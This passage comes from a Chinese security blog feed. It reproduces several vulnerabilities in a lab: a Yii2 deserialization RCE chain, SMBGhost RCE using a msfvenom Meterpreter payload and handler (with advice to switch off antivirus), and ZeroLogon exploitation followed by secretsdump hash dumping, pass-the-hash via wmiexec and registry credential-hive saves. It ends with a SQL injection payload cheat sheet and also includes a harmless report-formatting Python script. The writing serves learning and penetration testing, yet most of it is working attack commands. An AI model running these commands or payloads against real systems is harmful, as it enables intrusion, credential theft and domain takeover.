src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/pop%E9%93%BE.png"></p><p>如图所示，EXP执行顺序为①②③最后RCE</p><p>①：new了一个BatchQueryResult对象，导致执行了BatchQueryResult类下的__construct函数</p><p>②：new了一个Generator对象，导致执行了Generator类下的__construct函数</p><p>③：new了一个CreateAction对象，导致执行了CreateAction类下的__construct</p><p>最后因为CreateAction类中run()方法中的checkAccess和id的值是可控的，导致了RCE。</p><p>根据EXP中的类，我们跟进每个文件去分析。</p><p>先new的BatchQueryResult，所以BatchQueryResult.php就是整个POP链的起点。</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/1.png"></p><p>1、BatchQueryResult类中<code>__destruct</code>调了<code>reset()</code>方法，然后可以看到<code>reset()</code>方法中的<code>$this-&gt;dataReader</code>是可控的，这里的$this-&gt;dataReader-&gt;close()可以利用魔法函数<code>__call</code>（前面说了，如果执行不存在的方法就会调用call方法），这就说明在EXP的第二个类Generator存在可利用的<code>__call</code>方法，继续跟进Generator.php。</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/call1.png"></p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/call2.png"></p><p>2、Generator类中看到<code>__call</code>调用了<code>format</code>方法,<code>format</code>又调用了<code>call_user_func_array</code>,但是<code>$formatter</code>和<code>arguments</code>都是不可控的；继续往下走，<code>$formatter</code>传入了<code>$this-&gt;getFormatter</code>,在这个方法中，<code>$this-&gt;formatters</code>是我们可控的，也就是说<code>getFormatter</code>方法的返回值是可控的,<code>call_user_func_array</code>这个函数的第一个参数可控，第二个参数为空;那么EXP中的下一步代入了一个无参数的方法去RCE；我们去查看下EXP的最后一步，CreateActiion类中的<code>run()</code>方法，跟进CreateAction.php文件。</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/rce.png"></p><p>3、CreateAction类中，run()很明显可以看到<code>$this-&gt;checkAccess</code>以及<code>$this-&gt;id</code>都可控，利用链就出来了</p><p><code>yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\CreateAction.php::run()</code></p><p><strong>复现：</strong></p><p>复现的第一步，先自己添加一个反序列化的入口，在controllers目录下新建一个存在反序列化的Action，<code>TestController.php</code></p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/controller.png"></p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/controller1.png"></p><p>入口建立成功后就可以去执行EXP了，执行EXP后会得到Base64编码后的序列化字符</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/expsuccess.png"></p><p>将攻击代码代入URL即可成功RCE</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/%E6%88%90%E5%8A%9Fexp.png"></p><h3 id="5、修复建议"><a href="#5、修复建议" class="headerlink" title="5、修复建议"></a>5、修复建议</h3><p>升级到2.0.38之后的版本即可成功修复此漏洞。</p><p><img src="/2021/01/08/CVE-2020-15148Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/git%E4%BF%AE%E5%A4%8D.png"></p><h3 id="6、参考链接"><a href="#6、参考链接" class="headerlink" title="6、参考链接"></a>6、参考链接</h3><p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p><p><a href="https://www.anquanke.com/post/id/86452">https://www.anquanke.com/post/id/86452</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMBGhost命令执行漏洞</title>
      <link href="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞简介："><a href="#漏洞简介：" class="headerlink" title="漏洞简介："></a><strong>漏洞简介：</strong></h3><p>该漏洞是由于SMBv3在处理 恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出。成功利用该漏洞的攻击者可以在目标SMB服务器或客户端上执行代码。</p><h3 id="受影响系统及应用版本"><a href="#受影响系统及应用版本" class="headerlink" title="受影响系统及应用版本"></a><strong>受影响系统及应用版本</strong></h3><p>Windows 10版本1903（用于32位系统）</p><p>Windows 10版本1903（用于基于ARM64的系统）</p><p>Windows 10版本1903（用于基于x64的系统）</p><p>Windows 10版本1909（用于32位系统）</p><p>Windows 10版本1909（用于基于ARM64的系统）</p><p>Windows 10版本1909（用于）基于x64的系统</p><p>Windows Server 1903版（服务器核心安装）</p><p>Windows Server 1909版（服务器核心安装）</p><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>CVE-<strong>2020-0796</strong> 相关检测工具及攻击代码：</p><p>git检测脚本：<a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p><p>奇安信检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-<strong>2020-0796</strong>-Scanner.zip</a></p><p>蓝屏POC：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-<strong>2020-0796</strong>-PoC</a></p><p>本地提权POC：<a href="https://github.com/danigargu/CVE-2020-0796">https://github.com/danigargu/CVE-<strong>2020-0796</strong></a></p><p>远程利用代码：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>本地提权：</strong>下载本地提权POC用PowerShell运行脚本</p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/0.gif"></p><p><strong>远程代码执行：</strong></p><p>生成MSF反向连接的木马</p><pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -b &#39;\x00&#39; -i 1 -f python</code></pre><p>将生成的POC在Exploit中换掉</p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2.png"></p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png"></p><p><strong>MSF进行监听</strong></p><pre><code>use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset lport 4444set rhost 192.168.33.131run</code></pre><p><strong>成功回弹：</strong></p><p><img src="/2020/12/31/SMBGhost%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/4.png"></p><p><strong>总结：</strong></p><p>火绒会阻止对外攻击，先关掉</p><p>有些人说更python版本有关，我3.7没问题，但有人3.6才行；内存听别人说必须4G才行，我亲测2G也可以。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE2020-1472漏洞复现</title>
      <link href="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p><p>微软MSRC于8月11日 发布了Netlogon 特权提升漏洞安全通告。此漏洞CVE编号CVE-2020-1472， CVSS 评分:10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>受害者：window server 2016（域控服务器）</p><p>攻击者：win10（python3环境，需下载impacket最新版本）</p><p>工具：<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a> （POC）</p><p>​     <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a> （EXP）</p><h1 id="复现过程坑点"><a href="#复现过程坑点" class="headerlink" title="复现过程坑点"></a>复现过程坑点</h1><p>1、impacket需要最新版本</p><p>2、linux下执行脚本在出现$之类的特殊字符需要\转义，window下不影响</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>首先得自己提起搭建好域控</p><p>IP：192.168.31.53</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%9F%9F%E6%8E%A7ip%E4%BB%A5%E5%8F%8A%E4%B8%BB%E6%9C%BA%E5%90%8D.jpg"></p><h3 id="POC验证漏洞"><a href="#POC验证漏洞" class="headerlink" title="POC验证漏洞"></a>POC验证漏洞</h3><p>使用pip install -r requirements.txt安装所需要的模块（需要手动安装最新版本的impacket）</p><p>impacket下载链接：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>    去根目录下执行python3 setup.py install</p><p>python3 zerologon_tester.py DC 192.168.31.53       POC验证漏洞</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Poc%E9%AA%8C%E8%AF%81.jpg"></p><h3 id="EXP攻击"><a href="#EXP攻击" class="headerlink" title="EXP攻击"></a>EXP攻击</h3><p>python3 cve-2020-1472-exploit.py DC 192.168.31.53</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/exp.jpg"></p><h3 id="HASH导出"><a href="#HASH导出" class="headerlink" title="HASH导出"></a>HASH导出</h3><p>通过impacket模块的secretsdump.py导出域控上的HASH</p><p>python3 secretsdump.py adtest.com/DC$@192.168.31.53 -no-pass</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AF%BC%E5%87%BAhash.jpg"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>我们用刚才导出的管理员hash来操作域控服务器</p><p>Python3 wmiexec.py adtest.com/<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x33;&#x31;&#46;&#x35;&#x33;">&#x61;&#x64;&#x6d;&#x69;&#110;&#x69;&#115;&#x74;&#x72;&#97;&#x74;&#111;&#114;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x33;&#x31;&#46;&#x35;&#x33;</a> -hashes :fd97d47fd98caa8d172a09fbfce086fe</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A8hash%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.jpg"></p><h3 id="恢复HASH"><a href="#恢复HASH" class="headerlink" title="恢复HASH"></a>恢复HASH</h3><pre><code>reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel system.savedel sam.savedel security.save</code></pre><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort.jpg"></p><p>Python3 secretsdump.py -sam sam.save -system system.save -security security.save local</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort1.jpg"></p><p>使用restorepassword.py进行HASH恢复</p><pre><code>python3 restorepassword.py adtest.com/DC@DC -target-ip 192.168.31.53 -hexpass 0e06e21f1bdc36f0aa33f60eabff715d6c3a64e5a78fbdd6162746b1c2e048791466a59f7c34b1ce125b704e19665e6b6a16b020eac763b27e9a370b78693c54c6d827bb3834e6de16548db240be98b7787b647221f6588bc9573b1ad87085f60cec80353056a45ae3fbed0995431cf0b8ce61e4ae79c2150abbeaf9720d34862c74fab0401545bf07f761068f3012efff70bc432b1ed4cf79ed165150d817a753de8bfc5fc0d533189242b1f21ace60160e6378db707aaf466d0e2ce2d96804d118fccde035242e1b754e7ce39f612bf45f3bacd9b2fd7380788c40215ccef77a84502399a69fea62e64791c3bce634</code></pre><p>成功恢复</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort_success.jpg"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于绿盟与Nessus原始漏洞的快速处理</title>
      <link href="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/"/>
      <url>/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        由于安服项目中经常要写漏扫报告，我这里写漏扫报告一般都是基于绿盟和Nessus的；不同公司出报告出法都是不一样的，问了些朋友，他们都是直接出原始报告即可（QAQ），但是我还需要在分析下原始报告结果，筛除可利用的漏洞并出一个分析报告（不知道有没有和我一样的，如果有，那你得仔细看了），但是这种ctrl+c，ctrl+v重复性的工作必然会浪费很多时间，于是就有了以下工具来处理此类问题，帮助安服hxdm节省时间</p><p>PS：工具很简单，因为是自己用，大部分参数写死了；可能有些大佬用不上，但还是希望大佬们给一些代码优化上的建议</p><h1 id="判断依据"><a href="#判断依据" class="headerlink" title="判断依据"></a>判断依据</h1><p>​        既然要分析，那肯定得有个自己判断的依据，这里采用exploit-DB和Coresecurity网站可利用的漏洞做对比，通过CVE编号做判断，当然你也可以用别的库，比如MSF的库等等；个别漏洞需要根据自己的经验来判断，比如各种未授权访问，这些漏洞都是没有CVE编号的，但是Nessus有插件ID可以做判断，绿盟的可以通过标题做判断，你可以把这些漏洞单独选出来可以做一个人工库。</p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><p>​        根据自己的word模板往里批量写内容，我们是这样的模板，重复性的工作就是表格内容和下面的漏洞介绍，以前都是ctrl+c,然后ctrl+v，浪费了不少学习时间，当时菜是原罪，不过现在也菜QAQ。</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/2.jpg"></p><p>先看下绿盟的HTML扫描结果和Nessus的CSV扫描结果，这里绿盟的XLS的结果没有漏洞介绍和修复建议，所以就爬了下html页面，提取需要的内容。</p><p>绿盟中爬取了标题，影响IP，漏洞详情，解决方案，CVE，NSFOCUS这些字段</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/lvmeng%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85.jpg"></p><p>Nessus直接用导出的CSV做对比即可</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/nessus%E7%BB%93%E6%9E%9C.jpg"></p><p>漏洞库：Exploit-DB和Coresecurity（漏洞库不做分享，各位大佬可以自己做个人工库或者自己爬QAQ）</p><p>库的字段如下：</p><p>Exploit-DB:</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/exploit-db.jpg"></p><p>Coresecurity:</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/core.jpg"></p><p>​        先看下程序的几个函数名，整个过程与逻辑都很简单，这个小工具我也是边学边写边问的，可能有些地方优化不好QAQ,在底下源码中我会在注释中介绍每个函数，让刚入门python的小白能看懂，</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/1.jpg"></p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><pre><code class="python"># -*- coding:utf-8 -*-import docxfrom docx import Documentimport pandas as pdfrom lxml import etreeimport csvhtml = etree.parse(&#39;./index.html&#39;, etree.HTMLParser())#绿盟原始html报告做爬取def match(result, db):#与库中的CVE做对比并筛选出整行    scan_result = pd.read_csv(result, encoding=&#39;utf-8&#39;)  # 读取漏扫结果    db_result = pd.read_csv(db, encoding=&#39;utf-8&#39;)  # 读取db库    index = scan_result[&#39;CVE&#39;].isin(db_result[&#39;CVE&#39;]) #基于CVE判断是否存在/可以基于标题或者插件ID    outfile = scan_result[index] # index为布尔值，这里是取出布尔值为true的那行    outfile = outfile.dropna(axis=0,subset=[&#39;CVE&#39;], how=&#39;any&#39;)#去除每行的空值，库里有些漏洞是没有CVE的，这里做去重    return outfiledef html_Parse(level):  #通过颜色判断高中低    if level == &#39;color:#E42B00&#39;:        info = &#39;高&#39;    elif level == &#39;color:#AF6100&#39;:        info = &#39;中&#39;    elif level == &#39;color:#737373&#39;:        info = &#39;低&#39;    return infodef concat(scan_result, db_file_name, db2_file_name):#这里是做了多个库对比后的合并，这里是对比2个    outfile = match(scan_result, db_file_name)    outfile2 = match(scan_result, db2_file_name)    file = [outfile, outfile2]    outfile = pd.concat(file)    return outfiledef merge():#nessus的CSV结果一个漏洞对应一个ip，所以csv中就有很多行，这里将它多行合为1行，一个漏洞对应多个IP    df = pd.read_csv(&#39;Nessus.csv&#39;, encoding=&#39;gbk&#39;)    csv_data = df.values.tolist()  # 变为集合做去重    result_dict = &#123;&#125;    result_set = set()    # 取出CVE    for i in csv_data:        cve = i[1]        result_set.add(cve)    cve_ip = &#123;&#125;    for cve in result_set:        ip_list = []        for i in csv_data:            if i[1] == cve:                ip_list.append(i[4])                result_dict[cve] = i        cve_ip[cve] = ip_list    res = []    for i in result_dict:        ip = &#39;&#39;        for j in cve_ip[i]:            j = j + &#39;\n&#39;            ip += j        result_dict[i][4] = ip        res.append(result_dict[i])    return res#整个过程都是操作的listdef WriteNessus():#写入word模板    df = merge() #取出nessus的结果    doc = docx.Document(&#39;Template.docx&#39;)#获取模板内容    tbs = doc.tables    tb = tbs[1]#选择第二个表格    data_list = []    for i in range(len(df)):        Name = df[i][7]        Host = df[i][4]        Risk = df[i][3]        data_list.append([str(i + 1), Name, Risk, Host, &#39;&#39;])#data_list写入需要内容    for index, i in enumerate(data_list):        index += 1#我模板标头是有格式的，这里我从第二行开始写        tb.add_row()#添加表格行        cells = tb.rows[index].cells  # 第几行的格子        for col in range(5):  # 设定每个格子的内容            cells[col].text = str(i[col])    data_list = []    for i in range(len(df)):        Name = df[i][7]        Description = df[i][9]        Host = df[i][4]        Solution = df[i][10]        data_list.append([Name, Description, Host, Solution])#data_list写入需要的内容    for i in range(len(df)):#写入漏洞介绍，IP，建议        doc.add_paragraph(data_list[i][0], style=&#39;Heading 3&#39;)        p1 = doc.add_paragraph()        text1 = p1.add_run(&quot;漏洞介绍&quot;)        doc.add_paragraph(data_list[i][1])        p2 = doc.add_paragraph()        text2 = p2.add_run(&quot;涉及资产IP&quot;)        doc.add_paragraph(data_list[i][2])        p3 = doc.add_paragraph()        text3 = p3.add_run(&quot;修复建议&quot;)        doc.add_paragraph(data_list[i][3])        text1.bold = True        text2.bold = True        text3.bold = True    doc.save(&quot;Nessus_result.docx&quot;)def WriteCSV(num):#将绿盟html结果中需要的信息写入csv，方便做提取    with open(&#39;lv.csv&#39;, &#39;a&#39;, newline=&#39;&#39;, encoding=&#39;utf-8&#39;) as csvfile:        writer = csv.writer(csvfile)        writer.writerow([&#39;Title&#39;, &#39;Content&#39;, &#39;Level&#39;, &#39;IP_result&#39;, &#39;Solution&#39;, &#39;CVE&#39;, &#39;NSFOCUS&#39;])        for i in range(num):            i += 1            title = html.xpath(                &#39;/html/body/div/div[4]/div[8]/div[2]/table/tbody/tr[&#39; + str(2 * i - 1) + &#39;]/td[2]/span/text()&#39;)            level = html.xpath(                &#39;/html/body/div/div[4]/div[8]/div[2]/table/tbody/tr[&#39; + str(2 * i - 1) + &#39;]/td[2]/span/@style&#39;)            content = html.xpath(&#39; //*[@id=&quot;table_4_1_&#39; + str(i) + &#39;&quot;]/td/table/tr[2]/td/text()&#39;)            solution = html.xpath(&#39;//*[@id=&quot;table_4_1_&#39; + str(i) + &#39;&quot;]/td/table/tr[3]/td/text()&#39;)            CVE = html.xpath(&#39;//*[@id=&quot;table_4_1_&#39; + str(i) + &#39;&quot;]/td/table/tr[7]/td/a/text()&#39;)            NSFOCUS = html.xpath(&#39;//*[@id=&quot;table_4_1_&#39; + str(i) + &#39;&quot;]/td/table/tr[9]/td/a/text()&#39;)            IP = html.xpath(&#39;//*[@id=&quot;table_4_1_&#39; + str(i) + &#39;&quot;]/td/table/tr[1]/td/a[last()]/@href&#39;)            level = (&#39;&#39;).join(level).strip()            level = html_Parse(level)            IP = (&#39;&#39;).join(IP)            html_IP = etree.parse(IP, etree.HTMLParser())            IP_tr = html_IP.xpath(&#39;//*[@id=&quot;report&quot;]/div[3]/div/table/tbody/tr&#39;)            IP_result = &#39;&#39;            for k in range(len(IP_tr)):                k += 1                ip = html_IP.xpath(&#39;//*[@id=&quot;report&quot;]/div[3]/div/table/tbody/tr[&#39; + str(k) + &#39;]/td[2]/a/text()&#39;)                xx = ip[0].strip()                IP_result += xx + &#39;\n&#39;            title = (&#39;&#39;).join(title).strip()            content = (&#39;&#39;).join(content).strip()            solution = (&#39;&#39;).join(solution).strip()            CVE = (&#39;&#39;).join(CVE).strip()            NSFOCUS = (&#39;&#39;).join(NSFOCUS).strip()            writer.writerow([title, content, level, IP_result, solution, CVE, NSFOCUS])    csvfile.close()def WriteNSFOCUS():#将绿盟结果写入报告    df =concat(&#39;lv.csv&#39;, &#39;../db/exploitDB.csv&#39;, &#39;../db/core.csv&#39;)    df = df.values.tolist()#转为list    doc = docx.Document(&#39;Template.docx&#39;)    tbs = doc.tables    tb = tbs[1]    data_list = []    for i in range(len(df)):        Name = df[i][0]        Host = df[i][3]        Risk = df[i][2]        data_list.append([str(i + 1), Name, Risk, Host, &#39;&#39;])    for index, i in enumerate(data_list):        index += 1        tb.add_row()        cells = tb.rows[index].cells  # 第几行的格子        for col in range(5):  # 设定每个格子的内容            cells[col].text = str(i[col])    data_list = []    for i in range(len(df)):        Name = df[i][0]        Description = df[i][1]        Host = df[i][3]        Solution = df[i][4]        data_list.append([Name, Description, Host, Solution])    for i in range(len(df)):        doc.add_paragraph(data_list[i][0], style=&#39;Heading 3&#39;)        p1 = doc.add_paragraph()        text1 = p1.add_run(&quot;漏洞介绍&quot;)        doc.add_paragraph(data_list[i][1])        p2 = doc.add_paragraph()        text2 = p2.add_run(&quot;涉及资产IP&quot;)        doc.add_paragraph(data_list[i][2])        p3 = doc.add_paragraph()        text3 = p3.add_run(&quot;修复建议&quot;)        doc.add_paragraph(data_list[i][3])        text1.bold = True        text2.bold = True        text3.bold = True    doc.save(&#39;NSFOCUS_result.docx&#39;)if __name__ == &#39;__main__&#39;:    WriteCSV(592)#参数为漏洞数量    WriteNSFOCUS()    # WriteNessus()</code></pre><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>最后的结果输出</p><p>绿盟</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/%E7%BB%BF%E7%9B%9F%E7%BB%93%E6%9E%9C.jpg"></p><p>Nessus</p><p><img src="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/Nessuss%E7%BB%93%E6%9E%9C.jpg"></p><p>然后在批量对空行去重、添加项目符号，在稍微改改内容和格式即可，整个报告出来几分钟就可以交付；Nessus需要中文的可以调用一个翻译接口，去做翻译。</p><p>希望这个工具可以帮助到一些安服人员的xdm</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL手工注入总结</title>
      <link href="/2020/08/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2020/08/11/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Mysql-手工注入"><a href="#0x01-Mysql-手工注入" class="headerlink" title="0x01 Mysql 手工注入"></a>0x01 Mysql 手工注入</h2><h3 id="1-1-联合注入"><a href="#1-1-联合注入" class="headerlink" title="1.1 联合注入"></a>1.1 联合注入</h3><pre><code>?id=1&#39; order by 4--+?id=0&#39; union select 1,2,3,database()--+?id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() --+?id=0&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+#group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name?id=0&#39; union select 1,2,3,group_concat(password) from users --+#group_concat 可替换为 concat_ws(&#39;,&#39;,id,users,password )?id=0&#39; union select 1,2,3,password from users limit 0,1--+</code></pre><p><strong>1.2 报错注入</strong></p><pre><code>1.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a));</code></pre><p>每个一个报错语句都有它的原理：</p><p>exp() 报错的原理：exp 是一个数学函数，取e的x次方，当我们输入的值大于709就会报错，然后 ~ 取反它的值总会大于709，所以报错。</p><p>updatexml() 报错的原理：由于 updatexml 的第二个参数需要 Xpath 格式的字符串，以 ~ 开头的内容不是 xml 格式的语法，concat() 